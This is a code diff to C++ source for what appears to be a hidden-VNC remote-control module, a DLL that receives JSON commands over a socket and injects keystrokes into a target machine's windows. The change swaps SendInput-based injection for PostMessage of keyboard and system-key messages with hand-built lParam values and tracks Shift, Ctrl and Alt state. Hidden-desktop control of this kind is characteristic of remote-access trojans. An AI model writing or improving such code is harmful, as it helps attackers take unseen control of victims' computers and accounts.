@@ -148,6 +148,10 @@ static HWND  g_mouseDownTarget[3] = { NULL, NULL, NULL };
 static atomic_int g_staticFrameCount(0);
 static atomic_bool g_forceFullFrame(false);
 
+static bool g_key_shift = false;
+static bool g_key_ctrl  = false;
+static bool g_key_alt   = false;
+
 // -----------------------------------------------------------------------
 
 static bool safe_send_json(SOCKET sock, const json& data) {
@@ -779,44 +783,28 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
     return SendInput(1, &input, sizeof(INPUT)) == 1;
 }
 
-static bool send_key_input(WORD vk, bool down) {
-    INPUT input{};
-    input.type = INPUT_KEYBOARD;
-    input.ki.wVk = vk;
-    input.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
-    return SendInput(1, &input, sizeof(INPUT)) == 1;
-}
-
-static bool send_unicode_input(WCHAR ch) {
-    INPUT inputs[2]{};
-    inputs[0].type = INPUT_KEYBOARD;
-    inputs[0].ki.wScan = ch;
-    inputs[0].ki.dwFlags = KEYEVENTF_UNICODE;
-    inputs[1].type = INPUT_KEYBOARD;
-    inputs[1].ki.wScan = ch;
-    inputs[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
-    return SendInput(2, inputs, sizeof(INPUT)) == 2;
-}
-
-static LPARAM key_lparam(WORD vk, bool keyUp) {
-    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
-    LPARAM lp = 1 | (scan << 16);
-    if (keyUp) lp |= 0xC0000000;
-    return lp;
-}
-
-static void post_key_fallback(HWND hwnd, int vk, const string& action) {
-    if (!hwnd || !IsWindow(hwnd)) return;
-    client_log("keyboard fallback PostMessage action=" + action +
-               " vk=" + to_string(vk) +
-               " hwnd=" + to_string((uintptr_t)hwnd));
-    if (action == "hvnc_keydown") {
-        PostMessageW(hwnd, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
-    } else if (action == "hvnc_keyup") {
-        PostMessageW(hwnd, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
-    } else if (action == "hvnc_char") {
-        PostMessageW(hwnd, WM_CHAR, (WPARAM)vk, 1);
+static bool is_extended_key(int vk) {
+    switch (vk) {
+        case VK_INSERT: case VK_DELETE: case VK_HOME: case VK_END:
+        case VK_PRIOR: case VK_NEXT: case VK_LEFT: case VK_UP:
+        case VK_RIGHT: case VK_DOWN: case VK_DIVIDE: case VK_RMENU:
+        case VK_RCONTROL: case VK_NUMLOCK:
+            return true;
     }
+    return false;
+}
+
+static LPARAM make_lparam(UINT vk, bool up, bool ext, bool alt) {
+    UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+    LPARAM lp = 1; // repeat count
+    lp |= (LPARAM(scan & 0xFF) << 16);
+    if (ext) lp |= (1L << 24);
+    if (alt) lp |= (1L << 29);
+    if (up) {
+        lp |= (1L << 30);
+        lp |= (1L << 31);
+    }
+    return lp;
 }
 
 static POINT screen_pt(int normX, int normY) {
@@ -957,27 +945,27 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = g_hCurrentFocus;
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
-            if (!hTarget || !IsWindow(hTarget)) continue;
+            HWND hTarget = GetFocusedWindow();
+            if (!hTarget) continue;
 
-            SetForegroundWindow(GetAncestor(hTarget, GA_ROOT));
-            SetFocus(hTarget);
-
-            bool sendInputOk = false;
             if (action == "hvnc_keydown") {
-                sendInputOk = send_key_input((WORD)vk, true);
+                if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_key_shift = true;
+                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_key_ctrl = true;
+                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_key_alt = true;
+
+                UINT msg = g_key_alt ? WM_SYSKEYDOWN : WM_KEYDOWN;
+                PostMessageW(hTarget, msg, vk, make_lparam(vk, false, is_extended_key(vk), g_key_alt));
             } else if (action == "hvnc_keyup") {
-                sendInputOk = send_key_input((WORD)vk, false);
+                if (vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT) g_key_shift = false;
+                if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL) g_key_ctrl = false;
+                if (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU) g_key_alt = false;
+
+                UINT msg = (g_key_alt || (vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU)) ? WM_SYSKEYUP : WM_KEYUP;
+                PostMessageW(hTarget, msg, vk, make_lparam(vk, true, is_extended_key(vk), g_key_alt));
             } else if (action == "hvnc_char") {
-                sendInputOk = send_unicode_input((WCHAR)vk);
+                PostMessageW(hTarget, WM_CHAR, vk, 1);
             }
-            if (!sendInputOk) {
-                client_log("SendInput failed action=" + action +
-                           " vk=" + to_string(vk) +
-                           " error=" + to_string(GetLastError()));
-            }
-            post_key_fallback(hTarget, vk, action);
+
             g_forceFullFrame = true;
             continue;
         }
@@ -1229,6 +1217,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_mouseDownTarget[2] = NULL;
             g_staticFrameCount = 0;
             g_forceFullFrame = false;
+            g_key_shift = false;
+            g_key_ctrl = false;
+            g_key_alt = false;
         } else if (action == "hvnc_quality") {
             lock_guard<mutex> lock(g_captureMutex);
             g_scalePercent = cmd.value("quality", 50);
